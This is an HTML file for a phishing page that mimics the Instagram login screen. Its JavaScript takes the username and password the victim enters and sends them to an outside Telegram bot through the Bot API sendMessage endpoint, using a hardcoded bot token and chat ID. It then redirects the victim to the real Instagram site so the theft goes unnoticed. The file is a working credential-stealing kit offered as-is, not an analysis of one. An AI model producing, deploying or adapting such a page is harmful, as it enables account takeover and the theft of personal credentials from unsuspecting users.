<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background-color: #fff;
            border: 1px solid #dbdbdb;
            padding: 40px 30px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }
        .login-container img {
            width: 175px;
            margin-bottom: 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin: 10px 0;
            border: 1px solid #dbdbdb;
            border-radius: 5px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 12px 0;
            background-color: #3897f0;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }
        button:hover {
            background-color: #318ce7;
        }
    </style>
</head>
<body>

<div class="login-container">
    <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
    <form id="loginForm" method="POST">
        <input type="hidden" name="chat_id" value="1900509620">
        <input type="hidden" name="text" id="message">
        <input type="text" id="username" placeholder="Phone number, username, or email" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" onclick="sendTelegram(event)">Log In</button>
    </form>
</div>

<script>
    function sendTelegram(event) {
        event.preventDefault();  // 

        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        var message = "Amir⌫\n" +"Email: " + username + "\nPassword: " + password;

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://api.telegram.org/bot6421601945:AAHfCxgub4hJFRp-bJqLEGg7EGJs6VnxYzQ/sendMessage", true);
        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        xhr.send("chat_id=1900509620&text=" + encodeURIComponent(message));

        // إ
        xhr.onload = function() {
            window.location.href = "https://www.instagram.com";
        };
    }
</script>

</body>
</html>
